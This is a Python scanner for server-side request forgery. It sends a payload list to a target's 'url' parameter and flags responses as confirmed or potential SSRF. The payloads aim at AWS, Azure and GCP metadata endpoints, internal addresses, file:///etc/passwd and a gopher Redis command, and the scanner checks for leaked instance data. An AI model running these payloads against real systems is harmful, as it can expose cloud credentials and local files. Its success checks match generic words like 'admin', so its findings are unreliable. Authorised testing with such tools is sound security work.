import requests
import logging
from urllib.parse import urljoin

# Extended SSRF payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1",  # Localhost
    "http://localhost",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure metadata
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
    "http://192.168.1.1",  # Internal network
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://internal.example.com",  # Internal hostname
    "file:///etc/passwd",  # Local file access
    "http://burpcollaborator.net",  # OOB interaction (placeholder)
    "gopher://127.0.0.1:6379/_INFO",  # Redis SSRF example
]

# Indicators of SSRF success
SSRF_INDICATORS = {
    "aws": ["instance-id", "ami-id", "hostname"],
    "azure": ["compute", "azEnvironment", "resourceId"],
    "gcp": ["projectId", "numericProjectId", "computeMetadata"],
    "local": ["root:x", "admin", "passwd"],  # /etc/passwd or similar
    "internal": ["router", "gateway", "admin"],
}

def check_ssrf(url, timeout=5):
    """
    Scans for SSRF vulnerabilities by testing payloads and analyzing responses.
    
    Args:
        url (str): Target URL (e.g., 'http://example.com/vuln').
        timeout (int): Request timeout in seconds.
    
    Returns:
        dict: Structured results with vulnerabilities and details.
    """
    results = {
        "action": "check_ssrf",
        "url": url,
        "vulnerabilities": [],
        "tested_urls": []
    }

    try:
        for payload in SSRF_PAYLOADS:
            test_url = urljoin(url, f"?url={payload}")
            results["tested_urls"].append(test_url)
            try:
                response = requests.get(test_url, timeout=timeout, allow_redirects=False)
                response_text = response.text.lower()

                # Check for SSRF indicators
                if response.status_code == 200:
                    for platform, indicators in SSRF_INDICATORS.items():
                        if any(ind in response_text for ind in indicators):
                            results["vulnerabilities"].append({
                                "issue": f"Confirmed SSRF: Accessed {platform} service",
                                "evidence": f"URL: {test_url} returned {indicators[0]}...",
                                "severity": "Critical"
                            })
                            break
                    else:
                        results["vulnerabilities"].append({
                            "issue": "Potential SSRF: Successful request",
                            "evidence": f"URL: {test_url} returned 200 OK",
                            "severity": "High"
                        })
                elif response.status_code in [301, 302]:
                    location = response.headers.get("Location", "unknown")
                    results["vulnerabilities"].append({
                        "issue": "Potential SSRF: Redirect detected",
                        "evidence": f"URL: {test_url} redirected to {location}",
                        "severity": "Medium"
                    })
                elif response.status_code == 403 and "169.254.169.254" in payload:
                    results["vulnerabilities"].append({
                        "issue": "Possible SSRF: Blocked metadata access",
                        "evidence": f"URL: {test_url} returned 403 Forbidden",
                        "severity": "Low"
                    })

            except requests.RequestException as e:
                logging.debug(f"SSRF test failed for {test_url}: {e}")
                # Don’t log every timeout as error—could be expected

    except requests.RequestException as e:
        logging.error(f"Failed to initiate SSRF scan for {url}: {e}")
        results["vulnerabilities"].append({
            "issue": "Scan failed",
            "evidence": str(e),
            "severity": "Unknown"
        })

    if not results["vulnerabilities"]:
        results["note"] = "No SSRF vulnerabilities detected with provided payloads."
    return results